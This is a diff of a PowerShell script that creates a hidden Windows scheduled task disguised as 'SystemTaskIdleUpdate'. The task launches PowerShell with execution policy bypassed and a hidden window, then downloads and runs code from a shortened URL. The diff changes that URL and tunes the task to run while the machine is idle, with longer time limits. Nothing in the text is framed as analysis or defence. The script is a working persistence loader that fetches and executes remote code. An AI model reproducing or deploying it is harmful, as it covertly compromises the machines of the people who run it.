@@ -1,5 +1,5 @@
 #
-#SystemTaskIdleUpdate 'http://bit.ly/1MImxuL', Temprorary when Idle
+#SystemTaskIdleUpdate 'http://goo.gl/MTekjk', Temprorary when Idle
 #
 
 $f=$env:TEMP;$f+='\SystemTaskIdleUpdate.xml';
@@ -11,10 +11,9 @@ $s = '<?xml version="1.0" encoding="UTF-16"?>
 $s+=$env:username+'</Author>
   </RegistrationInfo>
   <Triggers>
-    <TimeTrigger>
-      <StartBoundary>2015-10-16T23:21:00</StartBoundary>
+    <IdleTrigger>
       <Enabled>true</Enabled>
-    </TimeTrigger>
+    </IdleTrigger>
   </Triggers>
   <Principals>
     <Principal id="Author">
@@ -29,24 +28,25 @@ $s+=$env:computername+'\'+$env:username+'</UserId>
     <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
     <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
     <AllowHardTerminate>true</AllowHardTerminate>
-    <StartWhenAvailable>true</StartWhenAvailable>
     <RunOnlyIfNetworkAvailable>true</RunOnlyIfNetworkAvailable>
     <IdleSettings>
-      <StopOnIdleEnd>false</StopOnIdleEnd>
-      <RestartOnIdle>false</RestartOnIdle>
+      <Duration>PT15M</Duration>
+      <StopOnIdleEnd>true</StopOnIdleEnd>
+      <RestartOnIdle>true</RestartOnIdle>
+      <WaitTimeout>PT0S</WaitTimeout>
     </IdleSettings>
     <AllowStartOnDemand>true</AllowStartOnDemand>
     <Enabled>true</Enabled>
     <Hidden>true</Hidden>
-    <RunOnlyIfIdle>false</RunOnlyIfIdle>
+    <RunOnlyIfIdle>true</RunOnlyIfIdle>
     <WakeToRun>false</WakeToRun>
-    <ExecutionTimeLimit>P3D</ExecutionTimeLimit>
+    <ExecutionTimeLimit>PT8H</ExecutionTimeLimit>
     <Priority>7</Priority>
   </Settings>
   <Actions Context="Author">
     <Exec>
       <Command>powershell</Command>';
-$s+="<Arguments>-nop -ep bypass -w hidden -c iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1MImxuL')</Arguments>";
+$s+="<Arguments>-nop -ep bypass -w hidden -c iex(New-Object Net.WebClient).DownloadString('http://goo.gl/MTekjk')</Arguments>";
 $s+='</Exec>
   </Actions>
 </Task>';
@@ -81,7 +81,7 @@ $s+=$env:username+'</Author>
         <Interval>PT3H</Interval>
         <StopAtDurationEnd>false</StopAtDurationEnd>
       </Repetition>
-      <ExecutionTimeLimit>PT15M</ExecutionTimeLimit>
+      <ExecutionTimeLimit>PT2H</ExecutionTimeLimit>
       <StartBoundary>2015-10-16T23:59:00</StartBoundary>
       <Enabled>true</Enabled>
     </TimeTrigger>
@@ -110,7 +110,7 @@ $s+=$env:computername+'\'+$env:username+'</UserId>
     <Hidden>true</Hidden>
     <RunOnlyIfIdle>false</RunOnlyIfIdle>
     <WakeToRun>false</WakeToRun>
-    <ExecutionTimeLimit>P3D</ExecutionTimeLimit>
+    <ExecutionTimeLimit>PT2H</ExecutionTimeLimit>
     <Priority>7</Priority>
   </Settings>
   <Actions Context="Author">
